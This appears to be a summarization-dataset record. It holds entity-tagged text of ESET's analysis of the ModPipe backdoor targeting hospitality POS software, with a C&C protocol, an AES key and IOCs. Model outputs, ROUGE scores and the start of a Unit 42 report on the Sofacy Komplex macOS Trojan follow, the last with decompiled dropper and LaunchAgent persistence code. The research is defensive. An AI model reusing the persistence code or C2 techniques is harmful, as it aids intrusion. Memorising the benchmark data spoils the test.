[GPE] v5.4 . For all the other versions , we were able neither to confirm nor deny the ability of the component to obtain the targeted libraries . Downloadable module : [ORG] ModScan [ORG] 2.20The main purpose of [ORG] ModScan [ORG] 2.20 is to collect additional information about the installed MICROS POS environment on the machines by scanning selected [ORG] IP addresses . The [ORG] ModScan [ORG] 2.20 module is injected into one of the processes specified by the [ORG] C&C via an [ORG] InstallMod command ( 0x72 ) . Based on our findings , it is typically associated with [CARDINAL] one of the following legitimate processes : [PERSON] MDSHTTPService.exe ( [ORG] MICROS [ORG] MDS [ORG] HTTP [ORG] Service ) CALSrv.exe ( [ORG] MICROS [ORG] CAL [ORG] Service [ORG] \u2013 Client Application Loader server ) services.exeDifferences between the injected processes misused by [PERSON] GetMicInfo and those targeted by [ORG] ModScan [ORG] 2.20 might be caused by the fact that [PERSON] GetMicInfo module is injected only into processes running under WOW64.The list of [ORG] IP addresses intended for scanning and the special \u201c ping \u201d IP address are specified by the [ORG] C&C in [CARDINAL] one of [CARDINAL] two ways . It is either:1 . downloaded from the [ORG] C&C along with the [NORP] ModScan module , or [CARDINAL] 2 . received during runtime , using the named pipe associated with the [NORP] ModScan module . The [ORG] ModScan module handles pipe commands listed in [ORG] Table 2.Table 2 . [ORG] ModScan [ORG] 2.20 module pipe commandsCommand nameCommand descriptionurl for data , [ORG] ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityCommand nameCommand descriptionexitstopscanprmExitTerminate scanning threadsStart scanning [ORG] IPs specified in the command data to collect additional in- formation about the environmentSpecify special \u201c ping \u201d [ORG] IP addressScanning procedure routine1 . Before scanning , the module sends a special \u201c ping \u201d message containing a [QUANTITY] 32 - bit valuegenerated by the GetTickCount Windows API function to [ORG] TCP ports [DATE] 50123 ( used by [ORG] MDS [ORG] HTTP [ORG] Service ) and [DATE] 2638 ( used by [PERSON] SAP [PERSON] Sybase database server ) of the \u201c ping \u201d IP address.2 . The response from the \u201c ping \u201d IP address should contain the same [CARDINAL] 32 - bit value rotatedright by one bit and [ORG] XORed with the value [DATE] 0x6CF6B8A8 . If the response on [CARDINAL] at [CARDINAL] least [CARDINAL] one of the ports provides the appropriate value , the module will start the scan of the selected [ORG] IP addresses . A decompilation of this ping function is shown in Figure [CARDINAL] 4.Figure [CARDINAL] 4 . Hex - Rays decompiled code of the [NORP] ModScan ping functionality3 . When the [NORP] ModScan module starts the scan , some of the following information may begathered , depending on the parameters received along with the scan command : Version of the Oracle MICROS RES 3700 POS , which is acquired by sending an [ORG] HTTP [ORG] Post message ( see Figure [CARDINAL] 5 ) to the specified [ORG] IP address on port [DATE] 50123 used by [ORG] the [ORG] MDS [ORG] HTTP [ORG] Service . The sought - after information is stored between data xml tags ( < data>%version%</data > ) of the response from the service.url for data , [ORG] ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurity1234567891011121314151617181920POST /%s HTTP/1.1Accept : text / xmlUser - Agent : MDS POS ClientHost : % s:50123Content - Length : [CARDINAL] 459Connection : Keep - AliveCache - Control : no - cache < SOAP - ENV : Envelope xmlns : SOAP - ENV=\"url lope/\"><SOAP - ENV : Body xmlns : MCRS - ENV=\"MCRS - URI\"><MCRS - ENV : Service > MDSSYSUTILS</MCRS - ENV : Service><MCRS - ENV : Method > Reg_GetValue</MCRS - ENV : Method><MCRS - ENV : [ORG] SessionKey > Session</MCRS - ENV : SessionKey><MCRS - ENV : InputParameters><Key > SOFTWARE\\MICROS</Key><KeyType > HKEY_LOCAL_MACHINE</KeyType><KeyName > Version</KeyName></MCRS - ENV : InputParameters></SOAP - ENV : Body></SOAP - ENV : Envelope > Figure [CARDINAL] 5 . [ORG] MDS [ORG] HTTP [ORG] Service requestName of the database , extracted by sending a specially crafted [ORG] TCP packet ( possibly using the [ORG] CMDSEQ command protocol ) to the selected [ORG] IP address on port [DATE] 2638 used by [ORG] the [ORG] SAP [ORG] Sybase [ORG] Database [ORG] Server . The string representing the name of the database is located at offset 0x28 of the response sent by the database server.url for data , [ORG] ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityDatabase server data , such as its name , version of the [GPE] TDS protocol and the [GPE] TDS server version . To gain this information , the [NORP] ModScan module sends a hardcoded [ORG] TDS [ORG] 4.2 [ORG] & 5.0 Login Packet ( Figure [CARDINAL] 6 ) to the specified [ORG] IP address on port [DATE] 2638 . The response includes a Login Acknowledgement packet which , in both cases \u2013 success and failure \u2013 contains information about the database server and the [GPE] TDS versions used . The [GPE] TDS login packet is hardcoded , with username set to the built - in dba and a hardcoded password , which is potentially the default password in [DATE] some [DATE] RES [DATE] 3700 POS versions . As we have n\u2019t found any public reference to this password , we wo n\u2019t be publishing it in our blogpost . Figure [CARDINAL] 6 . [ORG] TDS [ORG] 4.2 [ORG] & 5.0 Login Packet used by the [ORG] ModScanmodule , dissected using [ORG] WiresharkDownloadable module : ProcListThe last of the downloadable modules we were able to obtain and dissect was [ORG] ProcList . This is a lightweight module that does n\u2019t have an assigned ID . Its main purpose is to collect information about currently running processes , including : name , process identifier ( [ORG] PID ) , parent process [ORG] PID , number of threads , token owner , token domain , process creation time , and command line.url for data , [ORG] ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityOptionally , [ORG] ProcList can also collect information about loaded modules for each of the running processes . Collected information is sent to the main module of the backdoor ( using pipe message [CARDINAL] 0x10000013).Initial dropperThe initial dropper is responsible for installing the next stage of the malware . During our investigation , we discovered [CARDINAL] one dropper executable on [CARDINAL] two compromised machines , stored in the following locations : C:\\IQXDatabase\\Live\\1.exe C:\\OasisLive\\1.exeEach time the initial dropper is executed , a unique configuration is generated , using mostly random bytes . This causes the hash of the dropped loader to change with each execution , complicating detection and tracking of the malware . The dropper component can drop the loader into [CARDINAL] two possible locations and set up the persistence mechanism by creating a Windows service or Windows registry [PERSON] Run key ( for details , please refer to the Indicators of Compromise section).The encrypted payload , containing the main functionality of the dropper , is stored in the dropper \u2019s resources as bitmaps named from A to L. The dropper decrypts this payload using the provided command line parameter , then executes it . The payload is responsible for decrypting the appropriate loader depending on the system architecture , so either [QUANTITY] 32 - bit or [QUANTITY] 64 - bit . Each of the loaders is encrypted using its own [LAW] XOR [LAW] key , each [PERSON] 0x80 bytes long . Decompiled code responsible for loading the payload from the binary \u2019s resources , its decryption and execution is shown in Figure 7.url for data , [ORG] ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityFigure 7 . Hex - Rays decompiled code \u2013 decryption and execution of the payload in the initial dropperurl for data , [ORG] ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityAn example of an encrypted and decrypted configuration with explanations is visible in Figure [CARDINAL] 8 . The configuration shown comes from the loader installed by the dropper sample the configuration can vary between older and newer versions of the loader executable . Figure [CARDINAL] 8 . Example of the loader \u2019s generated configuration ( upper is encrypted , lower decrypted)Persistent loaderThis component is responsible for both unpacking the main module and for its injection into one of the following processes : lsass.exe wininit.exe services.exeTo unpack the main module , the persistent loader uses different approaches for the [QUANTITY] 32 - bit and [CARDINAL] 64 - bit versions . While the [CARDINAL] 32 - bit loader is almost identical to the initial dropper \u2013 the only difference being the payloads stored in the resources \u2013 the [CARDINAL] 64 - bit loader uses completely different \u201c unpacking \u201d code . We have found [CARDINAL] seven different versions of the loader executables , each having a different compilation timestamp , with the oldest one probably originating in [DATE] December [DATE] 2017 and the latest in [DATE] June [DATE] 2020 . For the full timeline , see Figure [CARDINAL] 9 . A list of all the loader hashes is included in the Indicators of Compromise section.url for data , [ORG] ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityFigure [CARDINAL] 9 . Timeline of known [PRODUCT] ModPipe variants and their timestamps . Main moduleThe main module is mostly responsible for managing [ORG] C&C communication and for handling received messages / commands , either from [ORG] C&C or downloadable modules . To facilitate the communication with modules , the main module starts by creating a pipe with a randomly generated name formatted using the following format string:{%08X-%04X-%04X-%04X-%08X%04X}It then periodically checks the pipe for new messages using the PeekNamedPipe Windows API function . Messages are parsed and handled according to their content . For a full list of recognized pipe commands and messages see [LAW] Table [LAW] 3.Table [LAW] 3 . List of pipe message / command typesMessage codeDescription0x10000012 inject and execute received module in specified process0x10000013 data for [ORG] C&C server ( execution logs , stolen data , \u2026 ) 0x10000014 write requested configuration data to the file handle received in this mes - sage ( most likely handle to named pipe created by some other module ) ( main config , network config , loader name , main module [ORG] PID , ) 0x10000020 [ORG] C&C commands ( not encrypted ) \u2013 see Table 4 for the full list of availablecommands0x10000022 set module status ( or err code)0x10000023 set [ORG] C&C communication time intervals0x10000024 close received list of handles0x10000025 get handle of the process with specified [ORG] PID , duplicate it for some other specified process and send it through the received named pipe handle0x10000072 [ORG] C&C commands ( encrypted ) \u2013 see Table 4 for the full list of availablecommandsurl for data , [ORG] ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityFor the detailed structure and format used for the messages transferred through the pipe refer to Figure [DATE] 10.Figure [DATE] 10 . Structure of the main module \u2019s named pipe messagesFor communication with its [ORG] C&C server , the main module uses HTTP and port [CARDINAL] 80 . Each of the dissected samples contained a list of potentially available servers from which one was randomly chosen . A list of all [ORG] C&C addresses discovered over the course of our research is available in the Indicators of Compromise section . Messages sent to the [ORG] C&C ( see Figure [CARDINAL] 11 ) are constructed and encrypted within the main module \u2019s code.url for data , [ORG] ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityFigure 11 . Structure of the messages sent to the C&CBefore any communication with the [ORG] C&C , the main module generates [CARDINAL] two clean URLs and uses them to check for an internet connection and a clean - looking cover for the malicious traffic . The URLs use the following format www.%domain%[.]com/?%rand% , where % domain% is randomly chosen from google , bing and yahoo and % rand% is a random 32- bit unsigned integer represented in ASCII.Communication with the [ORG] C&C is encrypted using [ORG] AES in CBC mode with the following 128- bit key : [PERSON] F45D076FEC641691A21F0C946EDA9BD5 . Before encryption , [ORG] C&C messages start with a [QUANTITY] 4 - byte checksum , which is calculated as CRC32 ( message ) XORed with the [ORDINAL] first 4 bytes of the [ORG] AES key used to encrypt the message . In the case of the key mentioned above , this would be [CARDINAL] F4 [CARDINAL] 5D 07 6F.The data is transmitted using the lightweight networking module , which is injected on demand and exits immediately after uploading or downloading the requested message . To select the process for injection , the main module enumerates running processes and assigns them a priority value between 3 and 6 . Those with higher priority are injected [ORDINAL] first , based on the following criteria : Priority [QUANTITY] 6Priority [QUANTITY] 5Priority 4The highest priority , assigned to any process that has already been used successfully to inject a networking module , received a response from the [ORG] C&C and that is still running under the same [ORG] PID , name and [PRODUCT] CreationTime . Process name with no extension that matches one of the following process names used for browsers : iexplore , opera , chrome , firefoxProcess name with no extension that matches the following process names : explorer , svchosturl for data , [ORG] ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityPriority [CARDINAL] 3All the other running processes excluding the following system processes : system , lsass , csrss , lsm , winlogon , smss , wininitThe main reason behind the priority list is to inject processes that are expected to communicate over the network and at the same time avoid system processes that might attract attention if caught communicating over the network . Networking moduleThis [ORG] ModPipe module is responsible for sending requests to [ORG] C&C and parsing payload received in the [ORG] C&C responses . [ORG] HTTP [ORG] POST or GET methods with headers shown in Figure [CARDINAL] 12 and Figure [CARDINAL] 13 can be used to upload data to [ORG] C&C and download additional payloads and [ORG] C&C commands.123456789POST /robots.txt HTTP/1.1Accept : * /*Content - Length : % data_length%Content - Type : application / octet - streamUser - Agent : [PERSON] Mozilla/4.0 ( compatible ; [ORG] MSIE [ORG] 8.0 ; [EVENT] Windows [EVENT] NT [EVENT] 6.1 ; Trident/4.0)Host : % remote_host%Cache - Control : no - cache%data%Figure [CARDINAL] 12 . HTTP POST header used to contact [GPE] C&C12345GET [GPE] % rsrc_path% HTTP/1.1Accept : * /*User - Agent : [PERSON] Mozilla/4.0 ( compatible ; [ORG] MSIE [ORG] 8.0 ; [EVENT] Windows [EVENT] NT [EVENT] 6.1 ; Trident/4.0)Host : % remote_host%Cache - Control : no - cacheFigure [CARDINAL] 13 . HTTP GET message headerurl for data , [ORG] ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityResponses from the [ORG] C&C server have to be [CARDINAL] at [CARDINAL] least [CARDINAL] 33 - bytes long in order to be parsed by the networking module and the malicious payload is located after a sequence of [CARDINAL] 13 spaces followed by an HTML comment opening tag . An example of a server response including this sequence is shown in Figure 14.Figure [CARDINAL] 14 . Example C&C server response including encrypted payloadIf all conditions are met , the network module sends the [ORG] C&C response to the main module using a pipe message with ID [FAC] 0x10000072 . The main module then decrypts the payload , verifies its checksum and executes the [ORG] C&C command . Available commands are listed in [ORG] Table 4.Table 4 . List of available main module commandsCom- mand code0x010x050x0A0x0B0x0C0x0D0x0ECommand descriptionExitUpdate list of [ORG] C&C addressesInject and execute received module in specified processInject and execute received module in specified process ( module name is in- cluded in the [ORG] command)Optionally write module to the encrypted storage , then inject and execute re- ceived module in specified process \u2013 add it to the list of the installed modulesSend command to the named pipe belonging to the module with specified ID and queue the response for the upload to the C&CUninstall module with specified ID ( remove from the in - memory list and en- crypted storage)url for data , [ORG] ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityCom- mand code0x0FCommand descriptionSave network configuration to the encrypted storageConclusionModPipe shows quite a few interesting features . Probably the most intriguing finding is the algorithm hidden in one of the backdoor \u2019s modules , which was specifically designed to steal credentials by decrypting them from registry values . By acquiring the database passwords , the attackers gain broad access to sensitive information even though the most sensitive data stored in devices running RES 3700 POS should still be protected by encryption . [ORG] ModPipe \u2019s architecture , modules and their capabilities also indicate that its writers have extensive knowledge of the targeted RES 3700 POS software . The proficiency of the operators could stem from multiple scenarios , including stealing and reverse engineering the proprietary software product , misusing its leaked parts or buying code from an underground market . To keep the operators behind [PRODUCT] ModPipe at bay , potential victims in the hospitality sector as well as any other businesses using the RES 3700 POS are advised to : Use the latest version of the software . Use it on devices that run updated operating system and software . Use reliable multi - layered security software that can detect [ORG] ModPipe and similar threats . Indicators of CompromiseC&C [ORG] IP addresses191.101.31[.]223 194.32.76[.]192 [CARDINAL] 23.19.58[.]114 88.99.177[.]103 [CARDINAL] 91.209.77[.]172 [CARDINAL] 5.135.230[.]136C&C domains / [ORG] URLssubzeroday.zapto[.]org shj145ertyb.ddns[.]net / gettime.htmlurl for data , [ORG] ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityouidji12345.ddns[.]net / gettime.htmlDropper samples9F8530627A8AD38F47102F626DEC9F0173B44CD5 0F4355A17AABD3645788341EAC2A9BB759DB95EEFile [PERCENT] paths%CSIDL_APPDATA%\\Microsoft\\Windows\\{%rand_guid%}\\explorer.exe [PERCENT] % WINDIR%\\system32\\%random_name%.exe%rand_guid% \u2013 pseudo - random GUID formatted string % random_name% \u2013 from [CARDINAL] 4 to [CARDINAL] 7 pseudo - random letters ( a - z ) with the [ORDINAL] first [CARDINAL] one capital e.g. \u201c Cvoeqo.exe\u201dMITRE [PERSON] ATT&CK techniquesNote : This table was built using version 7 of the MITRE ATT&CK framework . Tactic IDNameDescriptionExe- tenceT1059.003 Command and [ORG] Command [ORG] ShellT1547.001 [ORG] Boot or [PERSON] Logon Au- tostart Execution : Registry Run [ORG] Keys [ORG] / [ORG] Startup FolderT1543.003 Create or Modify System Process : Windows ServiceAttackers were seen using [PRODUCT] Windows Com- mand [ORG] Shell to execute the initial dropper . ModPipe can use Registry Run key for persistence . ModPipe can create a new service for persistence.url for data , [ORG] ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityTactic IDNameDescriptionPrivi- trationT1134.001 Access Token Ma- nipulation : [ORG] Token Impersonation [ORG] / TheftAttackers were seen using partially modified [ORG] PrintSpoofer tool to drop and subsequently execute loader with SYSTEM privileges . T1055.002 Process Injection : Portable Exe- cutable InjectionT1205Traffic SignalingT1552.002 Unsecured Creden- tials : Credentials in RegistryModPipe can inject it \u2019s modules into various processes . [ORG] ModPipe \u2019s [ORG] ModScan module sends random [QUANTITY] 32 - bit values to [ORG] TCP ports [DATE] 50123 and [DATE] 2638 of the specified IP address and requires a specific response in order to continue exe- cuting its scan functionality . [ORG] ModPipe \u2019s GetMicInfo module retrieves en- crypted database passwords for ORACLE MICROS RES 3700 POS software from Win- dows Registry and uses a custom algorithm to decrypt them before uploading to the C&C.T1057Process Discovery ModPipe \u2019s [ORG] ProcList module can get informa - tion about processes running on a system . T1012Query RegistryModPipe \u2019s GetMicInfo module queries [ORG] the [ORG] Registry [ORG] for [ORG] ORACLE [ORG] MICROS [ORG] RES [ORG] 3700 POS version , database passwords and other configuration data . T1033System Owner / User DiscoveryModPipe gathers username and computer name from victim machines and reports them to the [ORG] C&C in initial message . T1071.001 Application LayerProtocol : Web ProtocolsT1573.001 Encrypted Channel : Symmetric CryptographyModPipe uses HTTP for command and control . ModPipe encrypts communication with [ORG] C&C using [ORG] AES in CBC mode . T1041T1029Exfiltration Over C2 ChannelModPipe exfiltrates data over its [ORG] C&C channel . Scheduled Transfer Default interval used by [ORG] ModPipe for upload - ing data to [ORG] C&C is set to [CARDINAL] 30 minutes.url for data , [ORG] ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityMartin Smol\u00e1r 12 Nov 2020 - 11:30AMNewsletterDiscussionurl", "generated_text": "ModPipe; POS software; ORACLE MICROS; Restaurant Enterprise Series; RES 3700 POS; customers; the US; the targeted software; the malware; downloadable modules; control; server; data; passwords; Windows registry values; data encryption; the first stage; persistence; the main module; communication; IP addresses; network; use; the Linux kernel; the module; keylogging; server; data integrity checks; a command; control; the script; the modules; the Windows Data Protection API; DPAPI; a backdoor; IOCs; a system; security; the attackers; the data; the infection chain; its functionality; authentication; techniques; modules; the malware; POS devices; hotels; hospitality; the operation; any information; The analysis; RAT.", "ref_text": "<START-1>The PDF describes a backdoor malware called ModPipe that targets point-of-sale (POS) software used in the hospitality industry. ModPipe was discovered by researchers at ESET who have been tracking it since late 2019. ModPipe uses a modular architecture, with an initial dropper, a persistent loader, a main module, networking modules, and downloadable modules that add specific functionality. One module called GetMicInfo contains an algorithm designed to decrypt database passwords stored encrypted in the Windows registry, showing the malware authors have extensive knowledge of the targeted POS software. While the most sensitive payment data should be protected by encryption, the decrypted credentials allow access to other sensitive information like transaction data, system configurations, and customer names. The full motives behind the operation are unclear. ModPipe uses HTTP for command and control communication, encrypting messages with AES. It can inject modules into running processes like explorer.exe for stealth. Infected systems were primarily found in the restaurant and hospitality industry in the United States. To defend against ModPipe, the PDF advises keeping POS software updated, running updated operating systems, and using reliable security software to detect the malware. Indicators of compromise like IP addresses, file hashes, and MITRE ATT&CK techniques are provided. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4945652173913043, "gpt3/lexical/rouge_rouge2": 0.22404371584699453, "gpt3/lexical/rouge_rougeL": 0.28260869565217395, "gpt3/lexical/rouge_rougeLsum": 0.28260869565217395, "gpt3_generated_text": ["ModPipe is a modular backdoor that targets ORACLE MICROS Restaurant Enterprise Series (RES) 3700 POS software used in the hospitality sector. It gives attackers access to sensitive data stored in these devices, including database passwords. The backdoor's authors demonstrate deep knowledge of the targeted software by using a sophisticated method to decrypt passwords from Windows registry values. The exfiltrated credentials allow the attackers to access database contents, but the most sensitive information, such as credit card numbers, is protected by encryption. The full business model behind the operation is unclear, but it is possible that another module exists to decrypt the more sensitive data. The distribution method of ModPipe is unknown, but the majority of the identified targets were in the restaurant and hospitality sectors in the United States. ModPipe uses a modular architecture with downloadable modules that add specific functionality to the backdoor. Some of these modules remain unknown. The article provides an overview of ModPipe's architecture, downloadable modules, and its functionality."]}, {"split_name": "val", "sample_id": "val_54", "prompt_text": "Extract the keywords: 6POSTED BY : [PERSON] Dani [PERSON] Creus , Tyler Halfpop and [PERSON] Robert [PERSON] Falcone on [DATE] September 26 , [DATE] 2016 [DATE] 11:00 [DATE] AMFILED IN : Unit [CARDINAL] 42 TAGGED : aerospace , [NORP] Komplex , OS X , Sofacy , TrojanUnit [CARDINAL] 42 researchers identified a new OS [PERSON] X [PERSON] Trojan associated with the [ORG] Sofacy group that we are now tracking with the \u2018 Komplex \u2019 tag using the Palo Alto Networks [ORG] AutoFocus threat intelligence platform . The [ORG] Sofacy group , also known as APT28 , [PERSON] Pawn [PERSON] Storm , [PERSON] Fancy [PERSON] Bear , and Sednit , continues to add to the variety of tools they use in attacks ; in this case , targeting individuals in the aerospace industry running the OS X operating system . During our analysis , we determined that [PERSON] Komplex was used in a previous attack campaign targeting individuals running OS X that exploited a vulnerability in the [ORG] MacKeeper antivirus application to deliver [PERSON] Komplex as a payload . [PERSON] Komplex shares a significant amount of functionality and traits with another tool used by Sofacy \u2013 the [PERSON] Carberp variant that Sofacy had used in previous attack campaigns on systems running [PRODUCT] Windows . In addition to shared code and functionality , we also discovered [NORP] Komplex command and control ( C2 ) domains that overlapped with previously identified phishing campaign infrastructures associated with the [ORG] Sofacy group . [PERSON] Komplex is a [GPE] Trojan that the [ORG] Sofacy group created to compromise individuals using OS X devices . The [GPE] Trojan has multiple parts , [ORDINAL] first leading with a binder component that is responsible for saving a [ORDINAL] second payload and a decoy document to the system . We found [CARDINAL] three different versions of the [NORP] Komplex binder , one that was created to run on x86 , another on x64 , and a third that contained binders for both x86 and x64 architectures . We found the following samples of the [NORP] Komplex binder:1 bit executable [EVENT] x86_64 universal binary with [CARDINAL] 2 architecturesRegardless of architecture , these initial binders all save a [ORDINAL] second embedded Mach [PERSON] - O file to \u2018 /tmp / content \u2019 . This file is the [PERSON] Komplex dropper used in the next stage of installation and to maintain persistence . After saving the [PERSON] Komplex dropper , these binders would then save a legitimate decoy document to the system and open them using the \u2018 Preview \u2019 application to minimize suspicion of any malicious activity . Figure [CARDINAL] 1 shows the main function found in [CARDINAL] one of the initial droppers that saves and opens a [ORG] PDF decoy , as well as executes another executable file saved as \u2018 /tmp / content\u2019 . Get Updates Sign up to receive the latest news , cyber threat intelligence and research from Unit 42.Business EmailSubmitSelect a CategorySelect a MonthMORE \u21921 24The \u201c Safe \u201d Zone and Other Challenges to [GPE] Japan \u2019s int _ main(int arg0 , int arg1 ) { Cybersecurity Governance Efforts var_28 = [ [ NSAutoreleasePool alloc ] init ] ; posted by [PERSON] Mihoko [PERSON] Matsubara on [DATE] September [DATE] 28 , var_38 = [ NSSearchPathForDirectoriesInDomains(0xf , [GPE] 0x1 , [GPE] 0x1 ) [DATE] objectAtIndex [DATE] 2016 var_40 = [ NSString stringWithFormat:@\"%@/roskosmos_2015 - 2025.pdf \" var_48 = [ NSString stringWithFormat:@\"SetFile -a E % @/roskosmos_2015 - 2025.pdf \" [WORK_OF_ART] Highlights [WORK_OF_ART] from [WORK_OF_ART] Australia [WORK_OF_ART] Cyber var_38 ] ; Security Summit 2016 var_50 = [ NSString stringWithFormat:@\"rm [PERCENT] -rf [PERCENT] % @/roskosmos_2015 - 2025.app \" var_58 = [ NSString stringWithFormat:@\"open -a [PERCENT] Preview.app [PERCENT] % @/roskosmos_2015- posted by [PERSON] Cristina [PERSON] Salmastlian on [DATE] September [DATE] 28 , 2025.pdf \" , var_38 ] ; [DATE] 2016 [ [ NSData dataWithBytes:_joiner length:0x20f74 ] writeToFile:@\"/tmp / content \" atomically:0x1 ] ; Confucius Says [PERSON] Malware [PERSON] Families system([var_50 UTF8String ] ) ; Get Further By Abusing Legitimate system(\"chmod [CARDINAL] 755 /tmp / content \" ) ; Websites [ [ NSData dataWithBytes:_pdf length:0x182c82 ] writeToFile : var_40 system([var_48 UTF8String ] ) ; posted by Micah Yates on [DATE] September [DATE] 28 , [DATE] 2016 var_70 = [ [ [ORG] NSTask alloc ] init ] ; [ var_70 setLaunchPath:@\"/tmp / content \" ] ; The Cybersecurity Canon : Cyber [ var_70 launch ] ; [ORG] Operations and [ORG] the [ORG] Use [ORG] of [ORG] Force in system([var_58 UTF8String ] ) ; [PERSON] remove(*arg1 ) ; posted by [ORG] Palo [ORG] Alto [ORG] Networks on [DATE] September [DATE] 27 , Next [ORG] - [ORG] Gen [ORG] Drive : [PERSON] Robert [PERSON] Megennis Ends Season With Strong Finish posted by [PERSON] Justin [PERSON] Hall on [DATE] September [DATE] 27 , 2016Figure [CARDINAL] 1 Main function within the [NORP] Komplex binderThe binder component saves a decoy document named roskosmos_2015-2025.pdf to the system and opens it using the Preview application built into OS X. Figure [CARDINAL] 2 shows a portion of the [CARDINAL] 17 page decoy document . This document is titled \u201c [WORK_OF_ART] \u041f\u0440\u043e\u0435\u043a\u0442 [WORK_OF_ART] \u0424\u0435\u0434\u0435\u0440\u0430\u043b\u044c\u043d\u043e\u0439 \u043a\u043e\u0441\u043c\u0438\u0447\u0435\u0441\u043a\u043e\u0439 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b \u0420\u043e\u0441\u0441\u0438\u0438 \u043d\u0430 [DATE] 2016 \u2013 2025 \u0433\u043e\u0434\u044b \u201d and describes [ORG] the [ORG] Russian [ORG] Federal [ORG] Space Program \u2019s projects [DATE] between [DATE] 2016 [DATE] and [DATE] 2025 . We do not have detailed targeting information regarding the [ORG] Sofacy group \u2019s attack campaign delivering [PERSON] Komplex at this time ; however , based on theMORE \u2192contents of the decoy document , we believe that the target is likely associated with the aerospace industry . Figure [CARDINAL] 2 Decoy document opened by [NORP] Komplex binder showing document regarding the RussianSpace ProgramThe Komplex dropper component is saved to the system as \u201c /tmp / content \u201d ( SHA256 : for installing a [ORDINAL] third executable to the system and setting up persistence for the [ORDINAL] third executable to launch each time the OS X operating system starts . This dropper also provided the basis for the name \u201c [PERSON] Komplex \u201d , which is seen in several folder paths that were included within the Mach - O file , such as \u201c /Users / kazak / Desktop / Project / komplex\u201d . The [PERSON] Komplex dropper is fairly straightforward from a functional perspective , as it contains all of its functionality within its \u201c _ main \u201d function . The \u201c _ main \u201d function ( Figure [CARDINAL] 3 ) accesses data within [CARDINAL] three variables named \u2018 _ Payload_1 \u2019 , \u2018 _ Payload_2 \u2019 and \u2018 _ Payload_3 \u2019 , and writes them to [CARDINAL] three files on the system.1 [CARDINAL] 25int _ main(int arg0 , int arg1 ) { var_38 = [ [ NSAutoreleasePool alloc ] init ] ; var_40 = [ NSData dataWithBytes:_Payload_1 length:0x15c1c ] ; var_48 = [ NSData dataWithBytes:_Payload_2 length:0x201 ] ; var_50 = [ NSData dataWithBytes:_Payload_3 length:0x4c ] ; [PERSON] system(\"mkdir -p /Users / Shared/.local/ & > /dev / null \" ) ; [PERSON] system(\"mkdir -p ~/Library / LaunchAgents/ & > /dev / null \" ) ; [ var_40 writeToFile:@\"/Users / Shared/.local / kextd \" atomically:0x1 [ var_48 writeToFile:@\"/Users / Shared / com.apple.updates.plist \" atomically:0x1 ] ; [ var_50 writeToFile:@\"/Users / Shared / start.sh \" atomically:0x1 ] ; system(\"cp /Users / Shared / com.apple.updates.plist $ HOME / Library / LaunchAgents/ [ORG] & > /dev / null \" ) ; remove(\"/Users / Shared / [ORG] com.apple.updates.plist \" ) ; system(\"chmod 755 /Users / Shared/.local / kextd \" ) ; system(\"chmod 755 /Users / Shared / start.sh \" ) ; var_58 = [ [ [ORG] NSTask alloc ] init ] ; [ var_58 setLaunchPath:@\"/Users / Shared / start.sh \" ] ; remove(\"/Users / Shared / start.sh \" ) ; } Figure [CARDINAL] 3 [ORG] Komplex Dropper \u2019s main function that drops [CARDINAL] three files to the system and runs a shellscriptThe \u201c _ main \u201d function writes the data within \u2018 _ Payload_1 \u2019 , \u2018 _ Payload_2 \u2019 , and \u2018 _ Payload_3 \u2019 plist entry into \u2018 launchd \u2019 to automatically execute the [NORP] Komplex payload each time the system starts . Figure [CARDINAL] 4 shows the contents of the \u2018 start.sh \u2019 script that sets up persistence for thepayload.1 2#!/bin / sh launchctl load -w ~/Library / LaunchAgents / com.apple.updates.plistFigure 4 Contents of the start.sh shell script that calls launchctlThe \u2018 start.sh \u2019 script loads \u2018 com.apple.updates.plist \u2019 , which sets the properties of the [NORP] Komplex payload that is executed from \u201c /Users / Shared/.local / kextd \u201d at system start up courtesy of the \u201c RunAtLoad \u201d parameter . Figure [CARDINAL] 5 shows the contents of the \u2018 com.apple.updates.plist \u2019 file loaded into \u2018 launchd\u2019.1 [CARDINAL] 21<?xml version=\"1.0 \" encoding=\"UTF-8 \" ? > < ! DOCTYPE plist PUBLIC \" -//Apple//DTD PLIST 1.0//EN \" \" url \" > < plist version=\"1.0 \" > < dict > < key > Label</key > < string > com.apple.updates</string > < key > ProgramArguments</key > < array > < string>/Users / Shared/.local / kextd</string > < /array > < key > KeepAlive</key > < false/ > < key > RunAtLoad</key > < true/ > < key > StandardErrorPath</key > < string>/dev / null</string > < key > StandardOutPath</key > < string>/dev / null</string > < /dict > < /plist > Figure [CARDINAL] 5 Contents of the [ORG] com.apple.updates.plist file showing how the dropper achievespersistenceThe ultimate purpose of the aforementioned components is to install and execute the [NORP] Komplex payload . The dropper component saves the payload to \u201c /Users / Shared/.local / kextd \u201d ( SHA256 : executes the payload . The payload begins by conducting an anti - debugging check to see if it is being debugged before proceeding with executing its main functionality , which can be seen in the \u201c AmIBeingDebugged \u201d function in Figure [CARDINAL] 6 . The \u201c AmIBeingDebugged \u201d function uses the \u201c sysctl \u201d function to check to see if a specific \u201c P_TRACED \u201d flag is set , which signifies that the process is being debugged . A particularly interesting part of this function is that it is very similar to the function provided by [ORG] Apple to its developers in a guide created in [DATE] 2004 titled \u201c [WORK_OF_ART] Detecting [WORK_OF_ART] the [WORK_OF_ART] Debugger \u201d . This is not the [ORDINAL] first time the [ORG] Sofacy group \u2019s malware authors have obtained techniques from publicly available sources , as demonstrated in the use of [ORG] the [ORG] Office [ORG] Test [ORG] Persistence [ORG] Method that they obtained from a blog posted in [CARDINAL] 2014.1 if ( ( ( ( sysctl(0x1 , [DATE] 0x4 , var_2A8 , [CARDINAL] 0x288 , [GPE] 0x0 , [CARDINAL] 0x0 ) = = [CARDINAL] 0x0 ? [ORG] 0x1 